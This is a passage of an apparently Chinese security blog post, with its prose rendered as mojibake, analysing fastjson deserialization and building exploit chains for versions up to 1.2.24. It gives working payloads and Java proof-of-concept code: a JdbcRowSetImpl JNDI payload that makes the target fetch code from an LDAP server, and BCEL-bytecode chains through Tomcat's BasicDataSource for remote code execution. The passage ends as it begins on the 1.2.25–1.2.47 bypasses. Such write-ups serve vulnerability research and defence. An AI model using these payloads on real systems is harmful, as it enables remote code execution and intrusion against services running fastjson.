class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;_&#x27;</span>) &#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">        propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">        propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line">    <span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; types[<span class="number">0</span>] == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">isFieldName</span> <span class="operator">=</span> <span class="string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="number">0</span>)) + propertyName.substring(<span class="number">1</span>);</span><br><span class="line">        field = TypeUtils.getField(clazz, isFieldName, declaredFields);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                 annotation, fieldAnnotation, <span class="literal">null</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ªç¯éå†æ¯ä¸ªæ–¹æ³•ï¼Œçœ‹æ˜¯å¦å­˜åœ¨ç¬¦åˆsetterçš„æ–¹æ³•ï¼š</p><p>æ»¡è¶³setå¼€å¤´ï¼Œå‚æ•°é•¿åº¦ä¸º1ï¼Œéstaticï¼Œæ–¹æ³•åæ€»é•¿åº¦å¤§äº3</p><p>ç„¶åï¼ŒæŠŠsetåç¬¬ä¸€ä¸ªå­—æ¯å°å†™ï¼Œå¹¶å–åé¢çš„å­—ç¬¦ä¸²ä¸ºå±æ€§åã€‚ä¹Ÿå°±æ˜¯è¯´ä¸æ˜¯æŒ‰ç…§å±æ€§å-&gt;å–setterçš„é€»è¾‘æ¥çš„ã€‚<strong>æ²¡æœ‰å¯¹åº”çš„å±æ€§åï¼Œä¹Ÿèƒ½å–åˆ°setter</strong>ã€‚getteråŒç†</p><p>ä¸Šä¸€èŠ‚çš„ç»“è®ºï¼š</p><blockquote><p>fastjsonæ ¹æ®@typeè¿˜åŸç±»ï¼Œæ˜¯åœ¨æœ¬åœ°ä»0å¼€å§‹å®ä¾‹åŒ–ï¼Œç„¶åè°ƒç”¨setterèµ‹å€¼</p><p>å¦‚æœè§£æå‡½æ•°é‡Œæœ‰JSON.toJSONï¼Œè¿˜ä¼šè°ƒç”¨getter</p><p>æŒ‰ä»¥ä¸‹é¡ºåºåˆ¤æ–­ï¼Œæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œä¼šè¢«å½“æˆsetterè°ƒç”¨ï¼š</p><ul><li>setå¼€å¤´ï¼Œå‚æ•°é•¿åº¦ä¸º1ï¼Œéstaticï¼Œæ–¹æ³•åæ€»é•¿åº¦å¤§äº3</li><li>æ²¡æœ‰setteræ–¹æ³•ï¼Œæœ‰å­—æ®µæ˜¯boolç±»å‹ï¼Œåˆ™ç”¨<code>is</code>åŠ ä¸Šé¦–å­—æ¯å¤§å†™åçš„å­—æ®µå»æŸ¥æ‰¾ï¼ˆæ‰€ä»¥isNameè¿™ç§ä¹Ÿç®—setterï¼‰</li><li>æ²¡æœ‰setteræ–¹æ³•ï¼Œæœ‰getteræ–¹æ³•ï¼Œå‚æ•°é•¿åº¦ä¸º0ï¼Œè¿”å›ç±»å‹æ˜¯å±äºCollection æˆ–å…¶å­ç±»ã€Map æˆ–å…¶å­ç±»ã€AtomicBooleanã€AtomicIntegerã€AtomicLongçš„ä¸€ç§</li></ul></blockquote><p>ç”±äºfastjsonæ˜¯æ ¹æ®å‚æ•°åœ¨æœ¬åœ°ä»0åˆ›å»ºç±»ï¼Œæ‰€ä»¥ä¼ è¾“çš„ç±»ä¸éœ€è¦å®ç°Serializableæ¥å£ï¼Œå­—æ®µæœ‰transientä¹Ÿæ— æ‰€è°“</p><p>ç†æ‰€åº”å½“çš„æƒ³åˆ°TemplatesImpl#getOutputPropertyç»„æˆGadgetã€‚ä½†æ˜¯ç”±äºæ˜¯åœ¨æœ¬åœ°åˆ›å»ºï¼Œsetterèµ‹å€¼ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬ç›´æ¥ä¼ è¾“èµ‹å¥½å€¼çš„å¯¹è±¡ï¼Œæ‰€ä»¥åå°„ä¿®æ”¹å­—æ®µçš„payloadä¸€æ¦‚ç”¨ä¸äº†ã€‚</p><h1 id="fastjson-lt-x3D-1-2-24"><a href="#fastjson-lt-x3D-1-2-24" class="headerlink" title="fastjson&lt;&#x3D;1.2.24"></a>fastjson&lt;&#x3D;1.2.24</h1><p>okï¼Œä¸‹é¢ç›´æ¥ç»™é“¾å§</p><h2 id="JdbcRowSetImpl-JNDI"><a href="#JdbcRowSetImpl-JNDI" class="headerlink" title="JdbcRowSetImpl JNDI"></a>JdbcRowSetImpl JNDI</h2><p>éœ€è¦åœ¨JNDIå½±å“ç‰ˆæœ¬ä¸‹ã€‚ç›®æ ‡å‡ºç½‘ï¼ˆèƒ½å¤–è”ï¼‰</p><p>æ¼æ´ç‚¹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155134171.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155134171.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”¨setterè§¦å‘ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155652491.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155652491.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>getterå› ä¸ºä¸æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶ï¼Œåœ¨æ— JSON.toJSONè§£æçš„æƒ…å†µä¸‹ç”¨ä¸äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155716945.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155716945.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl.setAutoCommit-&gt;</span><br><span class="line">JdbcRowSetImpl.connect</span><br></pre></td></tr></table></figure><p>yakit &#x2F; marshelsec &#x2F; misc.LdapAtkServeréƒ½èƒ½å¼€LDAPæ‰“JNDI</p><p>yakit -&gt; åè¿æœåŠ¡å™¨ -&gt; payloadé…ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://172.25.0.1:8085/aRWBgUym\&quot;,\&quot;autoCommit\&quot;:0&#125;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BCELå­—èŠ‚ç "><a href="#BCELå­—èŠ‚ç " class="headerlink" title="BCELå­—èŠ‚ç "></a>BCELå­—èŠ‚ç </h2><p>æ®é‡å²è®°è½½ï¼Œåœ¨ JDK &lt; 8u251 rt.jaréƒ½é›†æˆäº†BCEL ClassLoaderï¼Œåœ¨ä¸‹é¢è¿™ä¸ªåŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.bcel.internal.util</span><br></pre></td></tr></table></figure><p>åŒæ—¶åœ¨Tomcatä¸­ä¹Ÿä¼šå­˜åœ¨ç›¸å…³çš„ä¾èµ–</p><ul><li><p>tomcat7ï¼šorg.apache.tomcat.dbcp.dbcp.BasicDataSource</p></li><li><p>tomcat8åŠå…¶ä»¥åï¼šorg.apache.tomcat.dbcp.dbcp2.BasicDataSource</p></li></ul><p>éšä¾¿æ‰¾äº†ä¸ªä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.65<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¯¥ç±»ä¸‹çš„loadClassæ–¹æ³•å¦‚ä¸‹ï¼šå¦‚æœç±»ä»¥<code>$$BCEL$$</code>å¼€å¤´ï¼Œä¼šè°ƒç”¨createClassç”Ÿæˆå­—èŠ‚ç ï¼Œå¹¶ç”¨defineClassåŠ è½½å­—èŠ‚ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006162851917.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006162851917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>creatClassé‡Œç”¨Utility.decodeè§£å¯†class_nameç¬¬8ä½åçš„å†…å®¹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006163322368.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006163322368.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Utility.decodeå¯¹åº”äº†Utility.encode()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006163445870.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006163445870.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>soï¼Œä¼ å…¥<code>$$BCEL$$</code>+Utility.decode(payload)ç»è¿‡loadClasså³å¯RCE</p><p>é‚£æ€ä¹ˆè°ƒç”¨åˆ°loadClasså‘¢ï¼ŸBasicDataSourceçš„forNameè§¦å‘åŒäº²å§”æ´¾ï¼ŒæŒ‡å®šdriverClassLoaderå°±OKã€‚</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006182351359.png" class="lazyload placeholder" data-srcset="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006182351359.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆšå¥½æœ‰å¯¹åº”çš„setterå»ç»™è¿™å †å˜é‡èµ‹å€¼ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006182634501.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006182634501.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006182743233.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006182743233.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯æƒœå‘ä¸Šåªèƒ½getæ–¹æ³•è§¦å‘createDataSourceã€‚åªèƒ½parseObjectèƒ½åˆ©ç”¨ï¼ˆsetLogWriteræ²¡åŠæ³•ä»jsonä¼ å€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006191242263.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006191242263.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\Runtime_static.class&quot;</span>));</span><br><span class="line">    <span class="type">String</span> <span class="variable">bcel</span> <span class="operator">=</span> <span class="string">&quot;\&quot;&quot;</span>+<span class="string">&quot;$$BCEL$$&quot;</span>+Utility.encode(code,<span class="literal">true</span>)+<span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//payload = &#123;</span></span><br><span class="line">    <span class="comment">//              &quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span></span><br><span class="line">    <span class="comment">//              &quot;driverClassLoader&quot;:&#123;</span></span><br><span class="line">    <span class="comment">//                  &quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;,</span></span><br><span class="line">    <span class="comment">//              &#125;,</span></span><br><span class="line">    <span class="comment">//              &quot;driverClassName&quot;:bcel&#125;</span></span><br><span class="line">    <span class="comment">//          &#125;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\&quot;driverClassLoader\&quot;:&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\&quot;driverClassName\&quot;:&quot;</span> + bcel +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    System.out.println(payload);</span><br><span class="line">    JSON.parseObject(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>waitï¼Œå¥½åƒè¿˜æœ‰æ“ä½œ</p><h3 id="MapSerializer-gt-ASMSerializer"><a href="#MapSerializer-gt-ASMSerializer" class="headerlink" title="MapSerializer -&gt; ASMSerializer"></a>MapSerializer -&gt; ASMSerializer</h3><p>parseå¿…ä¼šèµ°åˆ°<code>DefaultJSONParser.parseObject(final Map object,Object fieldName)</code>ï¼Œå…¶ä¸­å¿…èµ°åˆ°è¿™ä¸ªifåˆ¤æ–­ï¼Œä¸”å¿…èµ°è¿›å»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006221446313.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006221446313.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å› ä¸ºObjectæœ¬æ¥å°±æ˜¯JSONObject</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006221717638.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006221717638.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>JSONObjectçš„çˆ¶ç±»æ˜¯JSONï¼Œè°ƒç”¨JSONObject.toStringä¼šèµ°åˆ°JSON.toString</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006224404531.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006224404531.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¥çœ‹JSON.toStringï¼Œè½¬åˆ°JSON.toJSONString</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006214827585.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006214827585.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè¿›è¿™ä¸ªJSONSerializer.write</p><p>æœ‰æ²¡æœ‰å¾ˆåƒJSON.toJSONï¼Ÿä¸€æ ·çš„æµç¨‹</p><p>ä½†æ˜¯å¹¶æ²¡æœ‰èµ°è¿›åˆ›å»ºASMå­—èŠ‚ç çš„åˆ†æ”¯ï¼Œè€Œæ˜¯ç”±äºæˆ‘ä»¬ä¼ å…¥JSONObjectç»§æ‰¿è‡ªMapï¼Œæ‰€ä»¥ä½¿ç”¨äº†MapSerializer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007143851229.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007143851229.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è°ƒç”¨writeæ–¹æ³•å°±èµ°è¿›äº†MapSerializer.write</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144328539.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144328539.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‡Œé¢å¾ªç¯è§£æJSONObjectçš„é”®å€¼å¯¹ï¼Œè€Œä¸”å–å‡ºäº†valueï¼Œå¦‚æœè¿™é‡Œvalueæ˜¯BasicDataSourceçš„è¯ï¼Œå°±ä¼šç±»ä¼¼JSON.toJSONé‚£æ ·ï¼Œåˆ›å»ºASMå­—èŠ‚ç å¹¶è°ƒç”¨getter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144544248.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144544248.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>åˆ›å»ºASMå­—èŠ‚ç å¹¶è°ƒç”¨getterè¯·è§å­—èŠ‚ç æå–çš„fastjsonæµç¨‹åˆ†æï¼š</p><p><a href="https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/#toJSON%E8%A7%A6%E5%8F%91getter">https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/#toJSON%E8%A7%A6%E5%8F%91getter</a></p></blockquote><p>è·Ÿè¿›åˆ°getObjectWriterä¹Ÿå¯ä»¥ç¡®è¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144755985.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144755985.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥ç”¨JSONObjectåµŒå¥—ä¸€ä¸ªé”®ä¸ºJSONObjectçš„jsonï¼Œè¿™ä¸ªé”®å†åµŒå¥—ä¸€ä¸ªå€¼ä¸ºBasicDataSourceçš„jsonï¼Œå³å¯è°ƒç”¨BasicDataSource.getConnection</p><p>å°±èƒ½å’ŒgetConntectè¿èµ·æ¥äº†</p><blockquote><p>è¿™é‡Œæˆ‘è°ƒè¯•å‘ç°ï¼Œæ˜¯ä»¥æ ˆçš„å½¢å¼è§¦å‘toStringï¼Œä»é‡Œåˆ°å¤–ï¼Œä¹Ÿå°±æ˜¯è¯´å…ˆBasicDataSource.toStringï¼Œå†JSONObject.toStringã€‚è™½ç„¶å¹¶ä¸é‡è¦</p></blockquote><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">JSON.parse -&gt;</span><br><span class="line">DefaultJSONParser.parseObject -&gt;</span><br><span class="line">JSONObject.toString -&gt; toJSONString</span><br><span class="line">MapSerializer.write -&gt;</span><br><span class="line">ASMSerializer_1_xxxå­—èŠ‚ç .write -&gt;</span><br><span class="line">BasicDataSource.getConnect -&gt;</span><br><span class="line">BasicDataSource.createDataSource -&gt;</span><br><span class="line">BasicDataSource.createConnectionFactory -&gt;</span><br><span class="line">com.sun.org.apache.bcel.internal.utilClassLoader.loadClass</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">:</span> <span class="string">&quot;x&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>test POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL_getConnect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//&#123;</span></span><br><span class="line">        <span class="comment">//    &#123;</span></span><br><span class="line">        <span class="comment">//        &quot;x&quot;:&#123;</span></span><br><span class="line">        <span class="comment">//                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span></span><br><span class="line">        <span class="comment">//                &quot;driverClassLoader&quot;: &#123;</span></span><br><span class="line">        <span class="comment">//                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        <span class="comment">//                &#125;,</span></span><br><span class="line">        <span class="comment">//                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        <span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//    &#125;: &quot;x&quot;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\Runtime_static.class&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bcel</span> <span class="operator">=</span> <span class="string">&quot;\&quot;&quot;</span>+<span class="string">&quot;$$BCEL$$&quot;</span>+ Utility.encode(code,<span class="literal">true</span>)+<span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        \&quot;aaa\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                \&quot;driverClassName\&quot;: &quot;</span>+ bcel+ <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;: \&quot;bbb\&quot;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>èƒ½æ‰“ç›®æ ‡ä¸å‡ºç½‘ï¼Œç›´æ¥æ‰§è¡Œå­—èŠ‚ç ï¼Œæ­é…Servletè¿›è¡Œå›æ˜¾ï¼Œæˆ–è€…å†™sshï¼Ÿ</p><p>ä½†æ˜¯éœ€è¦ç›®æ ‡æœ‰Tomcatä¾èµ–</p><h1 id="fastjson-1-2-25-1-2-47"><a href="#fastjson-1-2-25-1-2-47" class="headerlink" title="fastjson 1.2.25-1.2.47"></a>fastjson 1.2.25-1.2.47</h1><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>1.2.24æœ€ç»ˆè°ƒç”¨åˆ°çš„DefaultJSONParser.parseObjectï¼Œä»¥TypeUtils.loadClassåŠ è½½ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007161107312.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007161107312.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>1.2.25å¼€å§‹ï¼Œæ”¹ç”¨checkAutoTypeåŠ è½½ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008152248617.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008152248617.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªæ–¹æ³•é‡Œæäº†ä¸ªé»‘åå•ï¼š</p><figure 